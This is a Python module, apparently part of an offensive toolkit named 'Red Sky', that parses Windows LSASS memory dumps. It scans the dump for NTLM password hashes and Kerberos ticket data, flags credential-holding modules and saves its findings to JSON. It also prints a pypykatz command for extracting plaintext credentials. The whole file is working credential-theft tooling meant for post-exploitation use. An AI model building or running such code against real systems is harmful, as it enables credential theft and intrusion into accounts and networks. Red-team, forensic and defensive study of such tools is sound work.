# language: Python, file: Program/creds/lsass.py, target: Red Sky creds — LSASS parser
# Parse a minidump of LSASS. Heuristic scan for NTLM hashes + Kerberos tickets.
# For full parsing (plaintext creds, all hashes), use pypykatz.

import hashlib
import json
import re
import struct
import sys
from pathlib import Path
from typing import Dict, List, Optional

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import load_config, print_ok, print_err, print_info, print_warn, print_kv, print_bullet
from Program.utils.paths import OUTPUT_DIR


MDMP_HEADER_SIG = b"MDMP"
STREAM_MODULE_LIST = 4


def _read_minidump_header(data: bytes) -> Optional[Dict]:
    if data[:4] != MDMP_HEADER_SIG:
        return None
    try:
        (sig, version, num_streams, stream_dir_rva, checksum, ts, flags) = struct.unpack_from(
            "<4sIIIIIQ", data, 0
        )
    except struct.error:
        return None
    return {
        "signature": sig.decode(errors="replace"),
        "version": version,
        "num_streams": num_streams,
        "stream_dir_rva": stream_dir_rva,
        "timestamp": ts,
        "flags": flags,
    }


def _iter_streams(data: bytes, header: Dict):
    off = header["stream_dir_rva"]
    for _ in range(header["num_streams"]):
        try:
            stream_type, size, rva = struct.unpack_from("<III", data, off)
        except struct.error:
            return
        yield stream_type, size, rva
        off += 12


def _find_modules(data: bytes, header: Dict) -> List[Dict]:
    mods = []
    for stype, size, rva in _iter_streams(data, header):
        if stype != STREAM_MODULE_LIST:
            continue
        try:
            num_modules = struct.unpack_from("<I", data, rva)[0]
        except struct.error:
            continue
        off = rva + 4
        for _ in range(num_modules):
            try:
                base, size_of_image, checksum, ts, name_rva = struct.unpack_from(
                    "<QIIII", data, off
                )
            except struct.error:
                break
            try:
                nlen = struct.unpack_from("<I", data, name_rva)[0]
                nbytes = data[name_rva + 4:name_rva + 4 + nlen]
                name = nbytes.decode("utf-16-le", errors="replace")
            except (struct.error, UnicodeDecodeError):
                name = ""
            mods.append({
                "base": base,
                "size": size_of_image,
                "name": name,
            })
            off += 108
    return mods


def _scan_for_ntlm_hashes(data: bytes) -> List[Dict]:
    """Heuristic: scan for MSV1_0_PRIMARY_CREDENTIAL-ish patterns —
    16-byte hash + length 0x10, twice (NT + LM)."""
    hits = []
    seen = set()
    for i in range(0, max(0, len(data) - 48), 8):
        try:
            h_len = data[i + 16]
            lm_len = data[i + 32]
        except IndexError:
            continue
        if h_len != 0x10 or lm_len != 0x10:
            continue
        nt_hash = data[i:i + 16]
        lm_hash = data[i + 24:i + 40]
        h_hex = nt_hash.hex()
        if h_hex in seen:
            continue
        if h_hex == "0" * 32 or h_hex == "f" * 32:
            continue
        seen.add(h_hex)
        hits.append({
            "nt": h_hex,
            "lm": lm_hash.hex(),
            "offset": i,
        })
    return hits


def _scan_for_kerberos_tickets(data: bytes) -> List[Dict]:
    """Scan for ASN.1 DER sequences that look like Kerberos tickets."""
    hits = []
    for m in re.finditer(rb"\x61\x82[\x01-\xff]{2}", data):
        off = m.start()
        try:
            size = struct.unpack_from(">H", data, off + 2)[0]
        except struct.error:
            continue
        if 200 < size < 65535:
            chunk = data[off:off + size + 4]
            hits.append({
                "offset": off,
                "size": size,
                "chunk_sha256": hashlib.sha256(chunk).hexdigest(),
            })
    return hits[:50]


def cmd_parse(dump_path: str) -> int:
    p = Path(dump_path)
    if not p.exists():
        print_err(f"dump not found: {dump_path}")
        return 1

    size_mb = p.stat().st_size / (1024 * 1024)
    print_info(f"parsing {p.name} ({size_mb:.1f} MB)")
    print()

    with p.open("rb") as f:
        data = f.read()

    header = _read_minidump_header(data)
    if not header:
        print_err("not a valid minidump (missing MDMP header)")
        return 1

    print_kv("format", "minidump")
    print_kv("version", header["version"])
    print_kv("timestamp", header["timestamp"])
    print_kv("streams", header["num_streams"])

    mods = _find_modules(data, header)
    interesting = [m for m in mods if m["name"].lower().endswith((
        "lsass.exe", "samsrv.dll", "msv1_0.dll", "wdigest.dll",
        "kerberos.dll", "lsadb.dll",
    ))]
    print()
    print(f"{ARTERY}{BOLD}  interesting modules{RESET}")
    if interesting:
        for m in interesting:
            print(f"  {ARTERY}▓{RESET} {BONE}{m['name']:<24}{RESET} "
                  f"base=0x{m['base']:016x} size=0x{m['size']:x}")
    else:
        print(f"  {CLOT}(none identified){RESET}")

    print()
    print(f"{ARTERY}{BOLD}  scanning for NTLM hashes{RESET}")
    hashes = _scan_for_ntlm_hashes(data)
    if hashes:
        for h in hashes[:50]:
            print(f"  {ARTERY}▓{RESET} NT: {BONE}{h['nt']}{RESET}  "
                  f"LM: {ASH}{h['lm'][:16]}…{RESET}")
    else:
        print(f"  {CLOT}(none found — try pypykatz for full parse){RESET}")

    print()
    print(f"{ARTERY}{BOLD}  scanning for kerberos tickets{RESET}")
    tickets = _scan_for_kerberos_tickets(data)
    if tickets:
        print_ok(f"{len(tickets)} ASN.1 candidates")
        for t in tickets[:10]:
            print(f"  {ARTERY}▓{RESET} offset=0x{t['offset']:08x}  "
                  f"size={t['size']}  sha256={t['chunk_sha256'][:16]}…")
    else:
        print(f"  {CLOT}(none){RESET}")

    result = {
        "file": str(p),
        "size_bytes": p.stat().st_size,
        "header": header,
        "modules": interesting,
        "ntlm_hashes": hashes,
        "kerberos_tickets": tickets,
    }
    out = OUTPUT_DIR / f"lsass_{p.stem}.json"
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(json.dumps(result, indent=2, default=str))
    print()
    print_kv("saved", out)

    print()
    print_info("for full parsing (plaintext creds, all hashes):")
    print(f"  {ASH}python3 -m pypykatz lsa minidump {p}{RESET}")
    return 0


def run_cli(args: List[str]) -> int:
    if not args:
        print_err("usage: redsky creds lsass <minidump.dmp>")
        return 2
    return cmd_parse(args[0])


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
